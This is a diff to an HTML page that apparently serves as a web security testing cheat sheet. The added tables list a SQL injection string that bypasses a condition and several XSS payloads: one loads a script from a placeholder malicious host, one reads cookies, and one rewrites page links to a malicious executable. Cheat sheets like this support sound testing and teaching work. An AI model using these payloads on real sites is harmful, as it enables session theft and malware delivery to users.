@@ -28,9 +28,8 @@
     <div class="collapse navbar-collapse" id="myNavbar">
       <ul class="nav navbar-nav" role="tablist">
         <li class="active"><a href="#setup" data-toggle="tab" role="tab">Setup Guide</a></li>
-        <li><a href="#injection" data-toggle="tab" role="tab">Injection</a></li>
-        <li><a href="#auth" data-toggle="tab" role="tab">Broken Authentication</a></li>
         <li><a href="#xss" data-toggle="tab" role="tab">XSS</a></li>
+        <li><a href="#injection" data-toggle="tab" role="tab">Injection</a></li>
       </ul>
     </div>
   </div>
@@ -47,7 +46,24 @@
 </p> 
    </div>
    <div class="tab-pane" role="tabpanel" id="injection">
-        <p>Inj</p> 
+          <div class="container">
+  <h2>Testing with XSS</h2>
+  <p></p>            
+  <table class="table">
+    <thead>
+      <tr>
+        <th>Objective</th>
+        <th>Input</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>To bypass TRUE condition</td>
+        <td>1' or '1' = '1</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
    </div>
    <div class="tab-pane" role="tabpanel" id="auth">
         <p>authk</p> 
@@ -73,12 +89,26 @@
         <td>&lt;script&gt;alert(1);&lt;/script&gt;</td>
       </tr>
       <tr>
-        <td>John</td>
+        <td>When Stripping tags</td>
+        <td>%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e</td>
       </tr>
       <tr>
-        <td>John</td>
+       <td>Stored XSS</td>
+       <td>aaa@aa.com&#x22;&#x3E;&#x3C;script&#x3E;alert(document.cookie)&#x3C;/script&#x3E;</td>
       </tr>
-
+      <tr>
+        <td>Reflected XSS to change a links</td>
+        <td>http://example.com/index.php?user=&#x3C;script&#x3E;window.onload = function() {var AllLinks=document.getElementsByTagName(&#x22;a&#x22;); 
+AllLinks[0].href = &#x22;http://badexample.com/malicious.exe&#x22;; }&#x3C;/script&#x3E; </td>
+      </tr>
+      <tr>
+        <td>Tools to help XSS</td>
+        <td><a href="https://xsshunter.com/">https://xsshunter.com/</a></td>
+      </tr>
+      <tr>
+        <td>Games for testing XSS</td>
+        <td><a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></td>
+      </tr>
     </tbody>
   </table>
 </div> 
